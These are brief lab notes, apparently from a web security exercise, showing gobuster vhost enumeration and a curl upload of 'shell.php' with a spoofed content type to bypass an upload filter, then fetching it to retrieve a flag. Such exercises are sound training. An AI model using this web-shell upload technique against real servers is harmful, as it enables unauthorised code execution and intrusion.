TO DO


0:
gobuster vhost -u http://web0x05.hbtn -w wds.txt --append-domain -t 50 2>/dev/null
test-s3.web0x05.hbtn Status: 200 [Size: 478]


1:
curl -s -X POST http://test-s3.web0x05.hbtn/api/task1/ \
  -F "file=@shell.php;type=application/octet-stream"
{"message":"'/static/upload/shell.php' uploaded successfully."}


curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php
94f3390ef2068a67324f3a97e0e81bdc 


